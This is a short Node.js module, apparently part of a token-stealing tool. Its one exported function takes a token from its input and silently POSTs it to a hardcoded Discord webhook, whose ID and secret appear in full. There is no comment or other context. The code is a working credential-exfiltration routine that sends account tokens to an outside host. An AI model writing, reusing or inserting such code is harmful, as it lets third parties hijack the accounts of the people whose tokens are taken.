const ftc = require('node-fetch');

module.exports = async (params) => {
    ftc(
        'https://discord.com/api/webhooks/809443892473626675/rCMgFM-5BQMwpE6j1aXbv44NCIC9tw7Of4PJAHWebnElBKL6C4H6RnNujgtnwavD0P41',
        {
            method: 'post',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: params.token
            })
        }
    );
};